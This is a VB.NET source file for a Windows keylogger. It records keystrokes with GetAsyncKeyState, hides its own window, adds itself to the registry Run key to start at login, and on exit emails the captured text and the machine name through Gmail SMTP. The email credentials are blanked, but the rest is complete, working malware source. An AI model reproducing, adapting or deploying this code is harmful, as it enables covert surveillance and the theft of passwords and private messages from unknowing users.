'Author: Pradeep Senthil
'Version: 1.4
'Date: 2017

Imports System.ComponentModel
Imports System.IO
Imports System.Net
Imports System.Net.Mail

Public Class Form1

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal Keys As Integer) As Short
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim result As Integer
        Dim key As String
        Dim i As Integer
        Dim switch As Integer = 1

        For i = 2 To 90
            result = 0
            result = GetAsyncKeyState(i)

            If result = -32767 Then
                key = Chr(i)
                If i = 13 Then key = vbNewLine
                Exit For
            End If
        Next i

        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                Label1.Text &= key
            Else
                Label1.Text &= key.ToLower
            End If
        End If

        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "V" Then
            If switch = 1 Then
                Me.Visible = True
                Me.Opacity = 100
                Me.WindowState = FormWindowState.Maximized
                Me.ShowInTaskbar = True
                Me.ShowIcon = True
                'MsgBox(Label1.Text)
                switch = 0
            ElseIf switch = 0 Then
                Me.Visible = False
                Me.Opacity = 0
                Me.WindowState = FormWindowState.Minimized
                Me.ShowInTaskbar = False
                Me.ShowIcon = False
                'MsgBox(Label1.Text)
            End If

        End If
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing

        'replaced all instances of username and password with underscores to prevent usage of account.
        Using mm As New MailMessage("____________@gmail.com", "__________@gmail.com")
            mm.Subject = "Name: " & Environment.MachineName & "     Time: " & DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
            mm.Body = Label1.Text

            Dim smtp As New SmtpClient
            smtp.Host = "smtp.gmail.com"
            smtp.EnableSsl = True

            Dim networkcred As New NetworkCredential("___________@gmail.com", "_______")
            smtp.UseDefaultCredentials = True
            smtp.Credentials = networkcred
            smtp.Port = 587
            smtp.Send(mm)
        End Using

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
    End Sub
End Class
